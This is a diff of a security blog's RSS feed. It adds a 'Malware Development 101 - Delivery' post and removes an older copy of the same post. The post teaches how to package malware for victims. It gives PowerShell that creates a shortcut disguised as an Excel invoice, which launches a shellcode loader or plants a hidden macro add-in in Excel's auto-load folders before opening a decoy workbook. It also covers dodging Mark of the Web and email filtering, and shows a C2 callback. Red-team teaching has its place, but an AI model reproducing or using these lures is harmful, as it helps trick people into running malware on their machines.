@@ -6,7 +6,278 @@
         <description>Recent content in Posts on f0rk3b0mb</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
-        <lastBuildDate>Mon, 12 Jan 2026 12:04:06 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 10 Feb 2026 12:04:06 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>MalwareDevelopment101 - Delivery</title>
+        <link>https://f0rk3b0mb.github.io/p/malwaredevelopment101-delivery/</link>
+        <pubDate>Tue, 10 Feb 2026 12:04:06 +0300</pubDate>
+        
+        <guid>https://f0rk3b0mb.github.io/p/malwaredevelopment101-delivery/</guid>
+        <description>&lt;h1 id=&#34;malware-development-101---delivery&#34;&gt;Malware Development 101 - Delivery
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Delivery&lt;/strong&gt; refers to the stage where an attacker transfers or presents a weaponized payload to the intended target using a chosen attack vector.
+It involves selecting and using a channel such as email, a web service, removable media, or a network protocol to ensure the malicious content reaches the victim system or user.
+At this stage, no vulnerability is necessarily exploited and no code execution is required; the objective is solely to place the payload within reach of the target.  This can be used as a step to gain &lt;strong&gt;Initial access&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The most common method of delivery is through email phishing. Phishing is a social engineering technique that tricks users into clicking links or running suspicious software in order to gain access to an environment. This is beyond the scope of this article.&lt;/p&gt;
+&lt;p&gt;This article will be focusing on bundling the payload/malware for delivery to the target , including ways to prevent detection by email firewalls.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;An example attack path from Phishing to Delivery to initial access&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/91a034087e934535dd6ade1e067ce8a7.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;There are five parts for this:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Payload - this part contains the malicious code that will run on the victim host&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Decoy - this is the file/code that acts as a &amp;ldquo;trojan horse&amp;rdquo; to ensure that what the victim was expecting is what the victim sees&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Dropper - this is responsible for delivering or deploying the payload onto the target system, often designed to evade security controls during initial execution. , this can be achieved using tools such as &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/med0x2e/GadgetToJScript&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;GadgetToJScript&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Trigger - this is the file that the user will interact with after extracting the container.  You typically want this to be as &amp;lsquo;pain-free&amp;rsquo; as possible, like a double-click.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Container  - this provides a means of bundling your dependencies (trigger, payload, and decoy) into a single file.  This simplifies the process of sending multiple files to a victim and can add a level of obfuscation&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;payloads&#34;&gt;Payloads
+&lt;/h2&gt;&lt;p&gt;These can be in the form of :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Malicious dll that can be used in DLL sideloading - this is where legitimate applications are forced to load malicious dlls&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Installer Files (MSI) - this is where malware in packaged in msi files that trick a user who wants to install software into running malware&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Excel Addins - this is where we use macros in &amp;ldquo;.xlam&amp;rdquo; which are templates for excel. This can be used as a &lt;strong&gt;stager&lt;/strong&gt; to download the real malware.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;trigger&#34;&gt;Trigger
+&lt;/h2&gt;&lt;p&gt;Triggers can be in the form of :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Batch  scripts&lt;/li&gt;
+&lt;li&gt;Shell Link&lt;/li&gt;
+&lt;li&gt;Microsoft saved console&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;container&#34;&gt;Container
+&lt;/h2&gt;&lt;p&gt;Mark of the Web, aka MotW, is a zone identifier used to mark files that have been downloaded from the Internet as potentially unsafe.  This can be seen on a file by looking at its properties in Explorer or using PowerShell.&lt;/p&gt;
+&lt;p&gt;Certain container formats may preserve or strip Mark of the Web metadata, which directly impacts whether files are opened in Protected View or with security warnings.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/motw.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;motw&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;The ISO/IMG, ZIP, and WIM formats are solid choices as they&amp;rsquo;re natively supported by Windows.  You could go for something like 7z, Gz, or WinRAR, but a victim may not have the required software available to interact with them.  You can package your files manually, or use a tool such as &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/mgeeky/PackMyPayload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PackMyPayload&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;setup&#34;&gt;Setup
+&lt;/h2&gt;&lt;p&gt;For this tutorial I will use the following&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Excel Addin&lt;/strong&gt; as &lt;strong&gt;payload&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Excel file&lt;/strong&gt; as &lt;strong&gt;decoy&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Shell Link&lt;/strong&gt; as &lt;strong&gt;Trigger&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ISO&lt;/strong&gt; file as &lt;strong&gt;container&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;For the decoy excel file you can just create any file with dummy data. For this part i felt a bit lazy to create the file but realized if i downloaded one online i might fall victim to what im trying to teach here , haha ;)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/decoy.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Then we create the payload. The payload will be an excel addin.&lt;/p&gt;
+&lt;p&gt;To create an XLAM, create a new empty workbook and open the VB editor using Alt + F11.  Right-click on the VBAProject and select Insert &amp;gt; Module.&lt;/p&gt;
+&lt;p&gt;paste this&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Private Sub Auto_Open()
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   MsgBox &amp;#34;Hello World&amp;#34;, vbOKOnly, &amp;#34;pwned&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;End Sub
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Save it as an xlam file&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/xlam.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;This is just a simple example the code can be modified to download the second stage of a malware.&lt;/p&gt;
+&lt;p&gt;TODO: At the end of this section ill demo how to use a c2 beacon exe as a payload instead of this.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;For the trigger i will use a Shell Link. This are microsoft shortcut files.&lt;/p&gt;
+&lt;p&gt;The powershell code below is used to create a  trigger for exe payloads.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$wsh = New-Object -ComObject WScript.Shell
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk = $wsh.CreateShortcut(&amp;#34;.\Sales invoice tracker.xlsx.lnk&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.TargetPath = &amp;#34;%COMSPEC%&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Arguments = &amp;#39;/C start ShellCode-Loader.exe &amp;amp;&amp;amp; &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE&amp;#34; &amp;#34;Sales invoice tracker.xlsx&amp;#34;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.IconLocation = &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Save()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This one is for excel payloads&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wsh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;ne&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ComObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WScript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wsh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateShortcut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.\Sales invoice tracker.xlsx.lnk&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TargetPath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;%COMSPEC%&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Arguments&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/C xcopy /H payload.xlam &amp;#34;%APPDATA%\Microsoft\Excel\XLSTART&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; &amp;amp;&amp;amp; attrib -H &amp;#34;%APPDATA%\Microsoft\Excel\XLSTART\payload.xlam&amp;#34; &amp;amp;&amp;amp; &amp;#34;%ProgramFiles%\Microsoft Office&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;oot\Office16\EXCEL.EXE&amp;#34; &amp;#34;Sales invoice tracker.xlsx&amp;#34;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IconLocation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;%ProgramFiles%\Microsoft Office&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;oot\Office16\EXCEL.EXE,0&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Since excel automatically blocks macros in workbooks , we need to copy the xlam file to any of the following folders since excel will load it automatically when launched , I don&amp;rsquo;t know if we can consider this a means of persistence??&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Office16\Library\
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Office16\STARTUP\
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Office16\XLSTART\
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Templates\
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%APPDATA%\Microsoft\Excel\XLSTART\
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%APPDATA%\Microsoft\Templates\
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;hr&gt;
+&lt;p&gt;For the container we can use PackMyPayload to bundle the above artifacts in an iso file.&lt;/p&gt;
+&lt;p&gt;This are my current artifacts&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/artifacts.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ill put then in an iso file and hide payload.xlam and &amp;ldquo;Sales invoice tracker.xlsx&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/container.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;This is what the iso file looks when mounted&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/mount.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;If we try to open that&amp;hellip;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/container.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;This means the macro loaded successfully&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;For the exe payload , just replace the link and remove the xlam&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$wsh = New-Object -ComObject WScript.Shell
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk = $wsh.CreateShortcut(&amp;#34;.\Sales invoice tracker.xlsx.lnk&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.TargetPath = &amp;#34;%COMSPEC%&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Arguments = &amp;#39;/C start ShellCode-Loader.exe &amp;amp;&amp;amp; &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE&amp;#34; &amp;#34;Sales invoice tracker.xlsx&amp;#34;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.IconLocation = &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Save()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;![alt text](/images/mdv/new artifacts.png)&lt;/p&gt;
+&lt;p&gt;We get a callback as the excel opens&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/c2.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;disclaimer&#34;&gt;Disclaimer
+&lt;/h2&gt;&lt;p&gt;The techniques demonstrated in this article are for educational and research purposes only and are intended to illustrate how attackers approach the delivery stage of an attack. In real-world environments, modern defenses such as Microsoft Defender, Office macro restrictions, and application trust policies may prevent or disrupt these techniques. Successful execution is highly dependent on the target’s configuration, Office version, and security posture, and the presence of these controls does not imply a flawed environment.&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>MalwareDevelopment101</title>
         <link>https://f0rk3b0mb.github.io/p/malwaredevelopment101/</link>
         <pubDate>Mon, 12 Jan 2026 12:04:06 +0300</pubDate>
@@ -610,277 +881,6 @@
 &gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;Next i will move to the more advanced techniques.&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title>MalwareDevelopment101 - Delivery</title>
-        <link>https://f0rk3b0mb.github.io/p/malwaredevelopment101-delivery/</link>
-        <pubDate>Mon, 12 Jan 2026 12:04:06 +0300</pubDate>
-        
-        <guid>https://f0rk3b0mb.github.io/p/malwaredevelopment101-delivery/</guid>
-        <description>&lt;h1 id=&#34;malware-development-101---delivery&#34;&gt;Malware Development 101 - Delivery
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Delivery&lt;/strong&gt; refers to the stage where an attacker transfers or presents a weaponized payload to the intended target using a chosen attack vector.
-It involves selecting and using a channel such as email, a web service, removable media, or a network protocol to ensure the malicious content reaches the victim system or user.
-At this stage, no vulnerability is necessarily exploited and no code execution is required; the objective is solely to place the payload within reach of the target.  This can be used as a step to gain &lt;strong&gt;Initial access&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;The most common method of delivery is through email phishing. Phishing is a social engineering technique that tricks users into clicking links or running suspicious software in order to gain access to an environment. This is beyond the scope of this article.&lt;/p&gt;
-&lt;p&gt;This article will be focusing on bundling the payload/malware for delivery to the target , including ways to prevent detection by email firewalls.&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;An example attack path from Phishing to Delivery to initial access&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/91a034087e934535dd6ade1e067ce8a7.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;There are five parts for this:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;Payload - this part contains the malicious code that will run on the victim host&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Decoy - this is the file/code that acts as a &amp;ldquo;trojan horse&amp;rdquo; to ensure that what the victim was expecting is what the victim sees&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Dropper - this is responsible for delivering or deploying the payload onto the target system, often designed to evade security controls during initial execution. , this can be achieved using tools such as &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/med0x2e/GadgetToJScript&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;GadgetToJScript&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Trigger - this is the file that the user will interact with after extracting the container.  You typically want this to be as &amp;lsquo;pain-free&amp;rsquo; as possible, like a double-click.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Container  - this provides a means of bundling your dependencies (trigger, payload, and decoy) into a single file.  This simplifies the process of sending multiple files to a victim and can add a level of obfuscation&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;payloads&#34;&gt;Payloads
-&lt;/h2&gt;&lt;p&gt;These can be in the form of :&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;Malicious dll that can be used in DLL sideloading - this is where legitimate applications are forced to load malicious dlls&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Windows Installer Files (MSI) - this is where malware in packaged in msi files that trick a user who wants to install software into running malware&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Excel Addins - this is where we use macros in &amp;ldquo;.xlam&amp;rdquo; which are templates for excel. This can be used as a &lt;strong&gt;stager&lt;/strong&gt; to download the real malware.&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;trigger&#34;&gt;Trigger
-&lt;/h2&gt;&lt;p&gt;Triggers can be in the form of :&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Batch  scripts&lt;/li&gt;
-&lt;li&gt;Shell Link&lt;/li&gt;
-&lt;li&gt;Microsoft saved console&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;container&#34;&gt;Container
-&lt;/h2&gt;&lt;p&gt;Mark of the Web, aka MotW, is a zone identifier used to mark files that have been downloaded from the Internet as potentially unsafe.  This can be seen on a file by looking at its properties in Explorer or using PowerShell.&lt;/p&gt;
-&lt;p&gt;Certain container formats may preserve or strip Mark of the Web metadata, which directly impacts whether files are opened in Protected View or with security warnings.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/motw.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;motw&#34;
-	
-	
-&gt;&lt;/p&gt;
